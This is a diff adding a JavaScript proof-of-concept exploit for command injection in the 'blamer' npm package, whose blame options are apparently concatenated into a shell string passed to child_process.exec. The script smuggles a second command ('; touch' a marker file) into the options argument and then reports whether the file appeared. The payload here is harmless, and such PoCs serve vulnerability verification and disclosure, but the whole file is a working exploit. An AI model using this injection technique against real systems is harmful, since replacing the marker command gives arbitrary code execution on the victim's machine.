@@ -1,0 +1,22 @@
+```javascript
+// Exploit for command injection in blamer's git.js `exec` sink
+// blamer < fix concatenates the (attacker-controlled) blame options directly
+// into a shell string passed to child_process.exec, e.g.:
+//   exec('git blame ' + options + ' ' + basename, { cwd: dirname, ... })
+// Supplying a crafted `options` argument breaks out of the intended command.
+
+const Blamer = require("./node_modules/blamer");
+
+const blamer = new Blamer("git");
+const marker = "/tmp/blamer_pwned_" + Date.now();
+
+blamer.blameByFile(__filename, `-w; touch ${marker} #`)
+  .then(() => console.log("blame() resolved"))
+  .catch(() => console.log("blame() rejected (harmless, injection already ran)"))
+  .then(() => {
+    setTimeout(() => {
+      const exists = require("fs").existsSync(marker);
+      console.log(exists ? `VULNERABLE: injected command executed, created ${marker}` : "not vulnerable");
+    }, 200);
+  });
+```
